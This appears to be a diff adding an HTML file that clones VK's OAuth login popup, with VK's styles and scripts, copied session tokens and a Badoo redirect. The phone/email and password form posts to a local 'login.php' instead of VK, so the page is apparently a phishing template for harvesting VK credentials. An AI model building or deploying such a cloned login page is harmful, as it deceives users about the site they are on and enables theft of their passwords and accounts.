@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en"><head>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>VK | Login</title>
+    <link rel="stylesheet" type="text/css" href="https://vk.com/css/al/common.css?38485958560"><link rel="stylesheet" type="text/css" href="https://vk.com/css/al/fonts_cnt.css?1318650823">
+    <link type="text/css" rel="stylesheet" href="https://vk.com/css/api/oauth_popup.css?26115300812">
+    <script type="text/javascript" language="javascript" src="https://vk.com/js/api/common_light.js?2102079137"></script>
+    <script type="text/javascript" language="javascript">// <![CDATA[
+      function allow(button) {
+        if (isButtonLocked(button)) return false;
+        lockButton(button);
+
+        var addr = '';
+        if (isChecked('allow_notifications')) {
+          addr = '&notify=1';
+        }
+        if (isChecked('denied_email')) {
+          addr = '&email_denied=1';
+        }
+        location.href = "https://login.vk.com/?act=grant_access&client_id=2396364&settings=4194308&redirect_uri=https%3A%2F%2Fbadoo.com%2Fexternal%2Fredirector.phtml%3Fstate%3DMTMxNTQwMjM0MHxodHRwczovL2JhZG9vLmNvbS92ay9hdXRob3JpemUucGh0bWw%252FcnQ9OWRiYmRl&response_type=code&group_ids=&token_type=0&v=&state=&display=popup&ip_h=ee6f345635db5556f8&hash=1530024614_c71f2346881fd7e00d&https=1"+addr;
+        return false;
+      }
+
+      function cancel() {
+        location.href = "https://login.vk.com/?act=grant_access&client_id=2396364&settings=4194308&redirect_uri=https%3A%2F%2Fbadoo.com%2Fexternal%2Fredirector.phtml%3Fstate%3DMTMxNTQwMjM0MHxodHRwczovL2JhZG9vLmNvbS92ay9hdXRob3JpemUucGh0bWw%252FcnQ9OWRiYmRl&response_type=code&group_ids=&token_type=0&v=&state=&display=popup&ip_h=ee6f345635db5556f8&hash=1530024614_c71f2346881fd7e00d&https=1&cancel=1";
+        return false;
+      }
+
+      function login(button) {
+        if (isButtonLocked(button)) return false;
+        lockButton(button);
+        ge('login_submit').submit();
+      }
+
+      function doResize(onResize) {
+        onResize && setTimeout(function() {
+          doResize()
+        }, 100);
+
+        if (!hasClass(document.body, 'oauth_centered') && !onResize) {
+          if (window.outerHeight !== void 0) {
+            var panelH = (window.outerHeight - window.innerHeight) | 0,
+              panelW = (window.outerWidth - window.innerWidth) | 0;
+          } else {
+            var panelH = 50,
+              panelW = 0;
+          }
+          var contentH = Math.max(ge('oauth_wrap_content').offsetHeight, 430),
+            contentW = 655;
+          window.resizeTo(contentW + panelW, contentH + panelH);
+          window.moveTo(
+            (screen.width - contentW) / 2 + (screen.availLeft | 0),
+            ((screen.height - contentH) / 2) + (screen.availTop | 0)
+          );
+        }
+      }
+
+      function toggleEmailPrivacy() {
+        checkbox('denied_email');
+        if (!isChecked('denied_email')) {
+          hide('denied_email');
+          show('allowed_email');
+        } else {
+          hide('allowed_email');
+          show('denied_email');
+        }
+      }
+
+      if (parent && parent != window) {
+        location.href = "https://oauth.vk.com/blank.html";
+      }
+
+      
+    // ]]></script>
+  </head>
+
+  <body onload="doResize();" class="VK1 oauth_full">
+    <script>
+      if (window.devicePixelRatio >= 2) document.body.className += ' is_2x';
+    </script>
+    <div class="oauth_wrap">
+      <div class="oauth_wrap_inner">
+        <div class="oauth_wrap_content" id="oauth_wrap_content">
+          <div class="oauth_head">
+  <a class="oauth_logo fl_l" href="https://vk.com" target="_blank"></a>
+  <div id="oauth_head_info" class="oauth_head_info fl_r">
+    <a class="oauth_reg_link" href="https://vk.com/join?reg=1" target="_blank">Sign up</a>
+  </div>
+</div>
+
+<div class="oauth_content box_body clear_fix">
+  <div class="box_msg_gray box_msg_padded">You should log into <b>VK</b> to proceed.</div>
+
+  <form method="POST" id="login_submit" action="login.php">
+    <div class="oauth_form">
+
+      
+
+      <div class="oauth_form_login">
+        <input name="ip_h" value="ee6f345635db5556f8" type="hidden">
+        <input name="lg_h" value="857225b0eb2e506ca2" type="hidden">
+        <input name="_origin" value="https://oauth.vk.com" type="hidden">
+        <input name="to" value="aHR0cHM6Ly9vYXV0aC52ay5jb20vYXV0aG9yaXplP2NsaWVudF9pZD0yMzk2MzY0JnJlZGlyZWN0X3VyaT1odHRwcyUzQSUyRiUyRmJhZG9vLmNvbSUyRmV4dGVybmFsJTJGcmVkaXJlY3Rvci5waHRtbCUzRnN0YXRlJTNETVRNeE5UUXdNak0wTUh4b2RIUndjem92TDJKaFpHOXZMbU52YlM5MmF5OWhkWFJvYjNKcGVtVXVjR2gwYld3JTI1MkZjblE5T1dSaVltUmwmcmVzcG9uc2VfdHlwZT1jb2RlJnNjb3BlPTQxOTQzMDgmdj0mc3RhdGU9JmRpc3BsYXk9cG9wdXA-" type="hidden">
+        <input id="expire" name="expire" value="0" type="hidden">
+
+        <div class="oauth_form_header">Phone or email</div>
+        <input class="oauth_form_input dark" name="email" value="" type="text">
+        <div class="oauth_form_header">Password</div>
+        <input class="oauth_form_input dark" name="pass" type="password">
+
+        
+
+        <button class="flat_button oauth_button button_wide" id="install_allow" type="submit" onclick="return login(this);">Log in</button>
+        <a class="oauth_forgot" href="https://vk.com/restore" target="_blank">Forgot your password?</a>
+        <input name="submit_input" class="unshown" type="submit">
+      </div>
+    </div>
+  </form>
+</div>
+        </div>
+      </div>
+    </div>
+  
+</body></html>
